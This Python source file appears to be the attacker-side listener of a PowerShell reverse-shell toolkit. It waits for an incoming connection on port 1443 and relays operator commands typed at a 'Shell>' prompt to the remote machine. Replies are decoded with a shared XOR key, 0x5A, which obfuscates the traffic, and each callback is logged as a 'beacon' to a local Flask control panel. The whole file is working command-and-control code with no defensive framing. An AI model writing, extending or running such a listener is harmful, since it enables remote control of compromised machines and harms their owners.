import socket
import requests
from datetime import datetime

HOST = '0.0.0.0'
PORT = 1443
XOR_KEY = 0x5A  # Same key used in PowerShell XOR()

def xor_decode(data, key=XOR_KEY):
    return ''.join(chr(b ^ key) for b in data)

def notify_flask_beacon(ip, hostname):
    try:
        payload = "ps_reverse"
        requests.post("http://127.0.0.1:3000/beacon", json={
            "hostname": hostname,
            "ip": ip,
            "payload": payload
        })
        print(f"[+] Notified Flask of beacon: {hostname}")
    except Exception as e:
        print(f"[!] Failed to notify Flask: {e}")

def handler(conn, addr):
    print(f"[+] Connection from {addr[0]}:{addr[1]} at {datetime.now()}")

    # Notify Flask
    try:
        hostname = socket.gethostname()
        notify_flask_beacon(addr[0], hostname)
    except Exception as e:
        print(f"[!] Beacon notify failed: {e}")

    try:
        while True:
            cmd = input("Shell> ")
            if not cmd.strip():
                continue
            cmd += '\n'
            conn.sendall(cmd.encode('ascii'))

            response = b''
            conn.settimeout(2.0)
            try:
                while True:
                    chunk = conn.recv(4096)
                    if not chunk:
                        break
                    response += chunk
                    if len(chunk) < 4096:
                        break
            except socket.timeout:
                pass

            try:
                decoded = xor_decode(response)
                print(decoded)
            except Exception as e:
                print("[!] Failed to decode XOR. Showing raw output:")
                print(response.decode('ascii', errors='ignore'))

    except (ConnectionResetError, BrokenPipeError):
        print("[!] Connection closed by remote host.")
    finally:
        conn.close()

def main():
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.bind((HOST, PORT))
        s.listen(1)
        print(f"[+] PowerShell listener started on port {PORT}")
        conn, addr = s.accept()
        handler(conn, addr)

if __name__ == '__main__':
    main()
